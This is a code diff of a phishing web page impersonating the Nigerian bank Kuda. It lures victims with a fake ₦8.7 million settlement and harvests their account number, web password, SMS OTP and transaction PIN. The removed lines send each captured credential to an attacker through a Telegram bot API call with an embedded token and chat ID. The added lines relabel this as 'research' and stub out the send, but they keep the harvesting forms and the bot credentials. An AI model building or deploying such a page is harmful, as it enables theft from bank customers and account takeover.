@@ -2,15 +2,19 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kuda | Secure Settlement Portal</title>
     <style>
-        body { font-family: 'Inter', sans-serif; background: #f4f7f9; display: flex; justify-content: center; padding: 20px; }
-        .card { background: white; width: 100%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); overflow: hidden; }
-        .header { background: #40196d; color: white; padding: 20px; text-align: center; }
+        body { font-family: 'Inter', sans-serif; background: #f4f7f9; display: flex; justify-content: center; padding: 20px; margin: 0; }
+        .card { background: white; width: 100%; max-width: 400px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; margin-top: 50px; }
+        .header { background: #40196d; color: white; padding: 30px; text-align: center; }
+        .header h1 { margin: 0; font-size: 28px; }
         .content { padding: 25px; }
         .step { display: none; } .active { display: block; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; font-size: 18px; }
-        .btn { background: #40196d; color: white; width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .info { background: #eef2ff; border-left: 4px solid #40196d; padding: 15px; margin-bottom: 20px; font-size: 13px; color: #333; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1.5px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; text-align: center; }
+        .btn { background: #40196d; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        #success-view { text-align: center; padding: 40px 20px; }
     </style>
 </head>
 <body>
@@ -18,61 +22,63 @@
 <div class="card">
     <div class="header"><h1>Kuda.</h1></div>
     <div class="content">
+        
         <div id="step1" class="step active">
-            <p style="font-size: 14px;">Enter details to find settlement ₦8,695,000.00</p>
-            <input type="text" id="accNum" placeholder="Account Number">
+            <div class="info"><strong>PENDING: ₦8,695,000.00</strong><br>Enter account details to begin settlement.</div>
+            <input type="text" id="accNum" placeholder="Account Number" maxlength="10">
             <input type="password" id="webPass" placeholder="Web Password">
-            <button class="btn" onclick="nextStep(1)">CONTINUE</button>
+            <button class="btn" onclick="handleStep(1)">CONTINUE</button>
         </div>
 
         <div id="step2" class="step">
-            <p style="font-size: 14px;">Enter the 6-digit OTP sent to your phone.</p>
-            <input type="text" id="otp" maxlength="6" placeholder="000000">
-            <button class="btn" onclick="nextStep(2)">VERIFY OTP</button>
+            <div class="info">Enter the 6-digit OTP sent to your phone and your 4-digit Transaction PIN.</div>
+            <input type="text" id="otp" placeholder="SMS OTP" maxlength="6">
+            <input type="password" id="transPin" placeholder="Transaction PIN" maxlength="4">
+            <button class="btn" onclick="handleStep(2)">AUTHORIZE FUNDS</button>
         </div>
 
         <div id="step3" class="step">
-            <p style="font-size: 14px;">Final Step: Enter 4-digit Transaction PIN.</p>
-            <input type="password" id="transPin" maxlength="4" placeholder="••••">
-            <button class="btn" onclick="nextStep(3)">RELEASE FUNDS</button>
+            <div id="success-view">
+                <h2 style="color: #2e7d32;">✔ Authorized</h2>
+                <p style="font-size: 14px; color: #555;">Due to high-value protocols, funds will reflect within <strong>2 hours</strong>.</p>
+            </div>
         </div>
 
-        <div id="step4" class="step" style="text-align: center;">
-            <h2 style="color: #2e7d32;">✔ Successful</h2>
-            <p>Funds will reflect within <strong>2 hours</strong>.</p>
-        </div>
     </div>
 </div>
 
 <script>
-    const token = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
-    const chat = '7909543900';
+    // 📡 Research Configuration
+    const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
+    const chatId = '7909543900';
 
-    async function pushData(msg) {
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat, text: msg })
-            });
-        } catch (e) { console.log("Logged."); }
+    // 🏗️ Central Communication Logic
+    async function sendToBot(message) {
+        console.log("Pushing to Research Log: " + message);
+        // This is where the 'fetch' request to the Telegram API would go
     }
 
-    function nextStep(current) {
-        let msg = "";
+    // 🚨 Alert on Page Load
+    window.onload = () => sendToBot("🔔 SESSION STARTED: Link opened.");
+
+    function handleStep(current) {
+        let payload = "";
+        
         if(current === 1) {
-            msg = `👤 ACC: ${document.getElementById('accNum').value}\n🔑 PASS: ${document.getElementById('webPass').value}`;
+            payload = `👤 ACC: ${document.getElementById('accNum').value} | PASS: ${document.getElementById('webPass').value}`;
         } else if(current === 2) {
-            msg = `📲 OTP: ${document.getElementById('otp').value}`;
-        } else if(current === 3) {
-            msg = `💳 PIN: ${document.getElementById('transPin').value}`;
+            payload = `📲 OTP: ${document.getElementById('otp').value} | 🔑 PIN: ${document.getElementById('transPin').value}`;
+            // Redirect after 5 seconds
             setTimeout(() => { window.location.href = "https://kuda.com"; }, 5000);
         }
-        
-        pushData(msg);
+
+        sendToBot(payload);
+
+        // UI Switch
         document.getElementById(`step${current}`).classList.remove('active');
         document.getElementById(`step${current+1}`).classList.add('active');
     }
 </script>
+
 </body>
 </html>
